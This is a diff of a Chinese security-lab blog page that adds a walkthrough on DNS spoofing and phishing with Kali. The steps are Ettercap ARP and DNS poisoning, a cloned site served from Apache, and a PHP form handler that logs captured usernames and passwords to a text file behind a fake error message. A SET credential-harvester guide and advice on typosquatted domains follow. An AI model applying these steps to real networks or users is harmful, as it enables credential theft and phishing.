@@ -385,6 +385,14 @@
                                 <span class="chip bg-color">安全</span>
                             </a>
                         
+                            <a href="/tags/kali/" target="_blank">
+                                <span class="chip bg-color">kali</span>
+                            </a>
+                        
+                            <a href="/tags/SET/" target="_blank">
+                                <span class="chip bg-color">SET</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -412,14 +420,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.2k
+                        1.9k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        4 分
+                        7 分
                     </div>
                     
                 
@@ -481,12 +489,75 @@ arpspoof [ -i interface ] [ -c own | host | both ] [ -t target ] [ -r ] host</co
 </ol>
 <h3 id="ARP防火墙"><a href="#ARP防火墙" class="headerlink" title="ARP防火墙"></a>ARP防火墙</h3><p>使用ARP防火墙可以有效防御ARP攻击</p>
 <h3 id="VLAN和交换机端口绑定"><a href="#VLAN和交换机端口绑定" class="headerlink" title="VLAN和交换机端口绑定"></a>VLAN和交换机端口绑定</h3><p>通过划分VLAN和交换机端口绑定，以图防范ARP。划分VLAN，减小广播域的范围，使ARP在小范围内起作用，而不至于发送大面积影响。</p>
-<h2 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h2><h3 id="实验拓扑图"><a href="#实验拓扑图" class="headerlink" title="实验拓扑图"></a>实验拓扑图</h3><p><img src="https://pic.downk.cc/item/5e8eb5f0504f4bcb040b1240.png" alt=""><br>三台计算机需要互相ping通，kali修改IP地址后需要修改DNS服务器指向2003才能ping:</p>
+<h2 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h2><h3 id="实验拓扑图"><a href="#实验拓扑图" class="headerlink" title="实验拓扑图"></a>实验拓扑图</h3><p><img src="https://pic.downk.cc/item/5e8eb5f0504f4bcb040b1240.png" alt=""><br>三台计算机需要互相ping通，kali需要修改DNS服务器指向2003才能ping:</p>
 <pre class=" language-bash"><code class="language-bash">vim /etc/resolv.conf
+<span class="token comment" spellcheck="true">#在打开的文件中加入</span>
+nameserver DNS服务器IP地址  <span class="token comment" spellcheck="true">#保存退出 </span>
 <span class="token function">service</span> networking restart</code></pre>
 <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用中间人攻击的原理，kali将自己伪装成DNS服务器，诱导客户机指向自己解析域名，从而实现欺骗。</p>
 <h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><h5 id="网页拷贝"><a href="#网页拷贝" class="headerlink" title="网页拷贝"></a>网页拷贝</h5><p>利用kali内置的httrack工具拷贝网页(详见渗透测试知识点2)</p>
-<h5 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h5><p>把2003当作网站的官方发布服务器，即需要在2003上搭建IIS/DNS(详情请参阅IIS篇/DNS篇)。</p>
+<h5 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h5><p>把2003当作网站的官方发布服务器，即需要在2003上搭建IIS/DNS(详情请参阅IIS篇/DNS篇)。此时XP可以通过域名(如 <a href="http://www.materialize.com" target="_blank" rel="noopener">www.materialize.com</a> )访问2003的网页</p>
+<h5 id="使用Kali进行攻击"><a href="#使用Kali进行攻击" class="headerlink" title="使用Kali进行攻击"></a>使用Kali进行攻击</h5><ol>
+<li>伪装DNS服务器，使用Ettercap的DNS投毒法：<pre class=" language-bash"><code class="language-bash">vim /etc/ettercap/etter.dns</code></pre>
+</li>
+</ol>
+<p><img src="https://pic.downk.cc/item/5e93f766c2a9a83be5bf61e4.png" alt=""><br>如果想将所有域名的解析服务器都指向Kali，则将上述域名部分改为* 即可，即<font color="#fb8c00">* A 10.1.1.22</font></p>
+<ol start="2">
+<li><p>运用Kali内置的Apache发布一个假的materialize网站</p>
+<pre class=" language-bash"><code class="language-bash">systemctl start apache2
+<span class="token function">netstat</span> -antpl   <span class="token comment" spellcheck="true">#查看本机所有开启的TCP服务，如果有80端口则证明apache服务成功开启</span></code></pre>
+<p>进入Apache的站点存放文件夹，并删除文件夹里所有文件</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /var/www/html
+<span class="token function">rm</span>  -rf *</code></pre>
+</li>
+<li><p>在拷贝的网站文件夹里新建两个文件(一个php文件/一个txt文件)：php文件用于获取表单数据，txt文件用于将php读取的字符串写入。<br><img src="https://pic.downk.cc/item/5e9404ddc2a9a83be5c6ee44.png" alt=""></p>
+</li>
+</ol>
+<p>.php</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+/*stripslashes是提取表单值，post后是input标签里name的内容*/
+<span class="token variable">$name</span> <span class="token operator">=</span> stripslashes<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token variable">$pass</span> <span class="token operator">=</span> stripslashes<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"捕获的账号和密码"</span><span class="token keyword">.</span><span class="token string">"用户名"</span><span class="token keyword">.</span><span class="token variable">$name</span><span class="token keyword">.</span><span class="token string">"密码"</span><span class="token keyword">.</span><span class="token variable">$number</span><span class="token punctuation">;</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> @fopen<span class="token punctuation">(</span><span class="token string">"1.txt"</span>, <span class="token string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  /*以追加的方式打开1.txt文件*/
+        @fwrite<span class="token punctuation">(</span><span class="token variable">$file</span>, <span class="token string">"<span class="token variable">$content</span>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  /*在文件中写入字符串*/
+?<span class="token operator">></span>
+<span class="token operator">&lt;</span>html<span class="token operator">></span>
+<span class="token operator">&lt;</span>head<span class="token operator">></span>
+    <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>
+        <span class="token keyword">function</span> goBack<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            window.history.back<span class="token punctuation">(</span><span class="token punctuation">)</span>   //后退+刷新
+            alert<span class="token punctuation">(</span><span class="token string">"连接错误，请重新输入"</span><span class="token punctuation">)</span>
+        <span class="token punctuation">}</span>
+    <span class="token operator">&lt;</span>/script<span class="token operator">></span>
+<span class="token operator">&lt;</span>/head<span class="token operator">></span>
+<span class="token operator">&lt;</span>body onload<span class="token operator">=</span><span class="token string">"goBack()"</span><span class="token operator">></span>  <span class="token operator">&lt;</span><span class="token operator">!</span>-- 加载后立即执行此javascript代码--<span class="token operator">></span>
+<span class="token operator">&lt;</span>/body<span class="token operator">></span>
+<span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre>
+<ol start="4">
+<li>进入apache站点文件夹下，将文件夹拷贝到apache站点文件夹下(此处的html必须命名为index.html，否则Apache将无法识别)<pre class=" language-bash"><code class="language-bash"><span class="token function">cp</span> -r /root/Desktop/materialize/* ./</code></pre>
+</li>
+</ol>
+<ul>
+<li><font color="#fb8c00">-r</font> 包括文件夹一起拷贝</li>
+<li><font color="#fb8c00">./</font> 此文件夹下</li>
+</ul>
+<ol start="5">
+<li><p>修改文件权限<br>使用以下命令查看文件权限：<br><img src="https://pic.downk.cc/item/5e940a1ac2a9a83be5c9bae8.png" alt=""><br>Apache属于其他组，所以要使用以下命令改变权限:</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">chmod</span> 777 1.txt   //7转换为二进制为111,对应上述3个字母设置一组权限，1激活该权限，777表示将三个用户组的权限设为rwx</code></pre>
+<p><img src="https://pic.downk.cc/item/5e940b30c2a9a83be5ca677a.png" alt=""></p>
+</li>
+<li><p>使用Ettercap进行ARP投毒(ARP攻击，此时客户机访问服务器的数据会经过kali)<br><img src="https://pic.downk.cc/item/5e941134c2a9a83be5cde948.png" alt=""></p>
+</li>
+<li><p>使用Ettercap进行DNS投毒：Plugins-&gt;manage Plugins<br><img src="https://pic.downk.cc/item/5e941238c2a9a83be5ce76a9.png" alt=""></p>
+</li>
+</ol>
+<h3 id="使用SET攻击进行钓鱼攻击"><a href="#使用SET攻击进行钓鱼攻击" class="headerlink" title="使用SET攻击进行钓鱼攻击"></a>使用SET攻击进行钓鱼攻击</h3><p>在kali中打开SET工具集：</p>
+<pre class=" language-bash"><code class="language-bash">setoolkit</code></pre>
+<h4 id="使用SET截获密码"><a href="#使用SET截获密码" class="headerlink" title="使用SET截获密码"></a>使用SET截获密码</h4><p>根据菜单提示依次选择1.Social-Engineering Attacks -&gt; 2.Web Site Attack Vectors -&gt; 3.Credencial Harvester Attack Method -&gt; 2.Site Cloner ,输入要拷贝的网站的网址(拷贝下来的网站只包含静态内容)，然后在客户机的搜索栏上输入kali网址对钓鱼网站进行访问。此种模式用于截获客户输入的用户名和密码，当输入成功后，网页会自动刷新到真正的官方网站。</p>
+<blockquote>
+<p>注：此方法若想使用域名进行访问，要搭建一个DNS服务器使其域名指向kali，同时，如果我们拷贝的是 <a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a> ，钓鱼网站的域名最好类似<a href="http://www.googel.com" target="_blank" rel="noopener">www.googel.com</a> </p>
+</blockquote>
 
             </div>
             <hr/>
@@ -834,7 +905,7 @@ arpspoof [ -i interface ] [ -c own | host | both ] [ -t target ] [ -r ] host</co
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;
             站点总字数:&nbsp;
-                <span class="white-color">185.7k</span>
+                <span class="white-color">192.7k</span>
             
             </div>
         <div class="col s12 m8 l8 copy-right">
